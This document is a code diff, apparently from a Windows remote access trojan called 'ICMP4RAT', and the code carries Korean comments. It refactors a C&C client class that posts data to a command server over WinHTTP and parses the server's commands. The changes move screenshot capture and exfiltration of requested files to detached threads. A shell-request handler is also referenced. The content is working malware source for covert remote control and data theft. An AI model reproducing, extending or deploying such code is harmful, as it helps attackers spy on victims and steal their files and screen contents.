@@ -20,35 +20,38 @@ cncManager::cncManager(LPCWSTR server) {
 }
 
 cncManager::~cncManager() {
-    if (this->hRequest) WinHttpCloseHandle(this->hRequest);
-    if (this->hConnect) WinHttpCloseHandle(this->hConnect);
-    if (this->hSession) WinHttpCloseHandle(this->hSession);
 }
 
 /* C&C에 http request를 보내는 함수. send후 response parsing을 호출함. */
 void cncManager::sendHttpRequest(LPVOID data, DWORD dlen) {
     //std::lock_guard<std::mutex> guard(this->m1);
-    this->hSession = WinHttpOpen(L"ICMP4RAT", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+    HINTERNET
+        hSession = NULL,
+        hConnect = NULL,
+        hRequest = NULL;
 
-    if (this->hSession)
-        this->hConnect = WinHttpConnect(this->hSession, this->server, INTERNET_DEFAULT_HTTP_PORT, 0);
+    BOOL bResults = FALSE;
+     hSession = WinHttpOpen(L"ICMP4RAT", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, WINHTTP_FLAG_ASYNC);
 
-    if (this->hConnect)
-        this->hRequest = WinHttpOpenRequest(this->hConnect, L"POST", this->index, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
+    if (hSession)
+         hConnect = WinHttpConnect(hSession, this->server, INTERNET_DEFAULT_HTTP_PORT, 0);
+
+    if (hConnect)
+         hRequest = WinHttpOpenRequest(hConnect, L"POST", this->index, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
 
     DWORD dwSize = 0;
     DWORD dwDownloaded = 0;
 
-    if (this->hRequest)
-        this->bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, data, dlen, dlen, 0);
+    if (hRequest)
+        bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, data, dlen, dlen, 0);
 
-    if (this->bResults)
-        this->bResults = WinHttpReceiveResponse(this->hRequest, NULL);
+    if (bResults)
+        bResults = WinHttpReceiveResponse(hRequest, NULL);
 
-    if (!this->bResults)
+    if (!bResults)
         std::cout << "Error" << GetLastError() << "has occurred." << std::endl;
 
-    if (this->bResults)
+    if (bResults)
     {
         do
         {
@@ -88,9 +91,9 @@ void cncManager::sendHttpRequest(LPVOID data, DWORD dlen) {
         } while (dwSize > 0);
     }
 
-    if (this->hRequest) WinHttpCloseHandle(this->hRequest);
-    if (this->hConnect) WinHttpCloseHandle(this->hConnect);
-    if (this->hSession) WinHttpCloseHandle(this->hSession);
+    if (hRequest) WinHttpCloseHandle(hRequest);
+    if (hConnect) WinHttpCloseHandle(hConnect);
+    if (hSession) WinHttpCloseHandle(hSession);
     
 
 }   
@@ -214,18 +217,16 @@ void cncManager::responseParser(UCHAR* res, DWORD len) {
 
                 case ftpRequest:
                 {
-                 commandManager cmd;
-                 LPVOID ptr = NULL;
                     /* 스샷 요청 처리 */
                     this->printParsedResponse(resData, "FTP_REQUEST");
                     if (!data.compare("screenshot")) {
-                        ptr = cmd.getScreen();
-                        this->sendData(ftpResponse, cmd.screen_len, ptr);
-                        delete[] ptr;
+                        std::thread screenHandler = std::thread(&cncManager::handleScreenRequest, this);
+                        screenHandler.detach();
                     }
                     /* 파일 요청 처리 */
                     else {
-                        this->handleFtpRequest(data);
+                        std::thread ftpHandler = std::thread(&cncManager::handleFtpRequest, this,data);
+                        ftpHandler.detach();
                     }
                     break;
                 }
@@ -276,4 +277,12 @@ void cncManager::handleShellRequest() {
 void cncManager::handleFtpRequest(std::string path) {
     commandManager commander;
     commander.getFile(path,this->server);
+}
+
+void cncManager::handleScreenRequest() {
+    commandManager commander;
+    LPVOID ptr = commander.getScreen();
+    this->sendData(ftpResponse, commander.screen_len, ptr);
+    delete[] ptr;
+    
 }
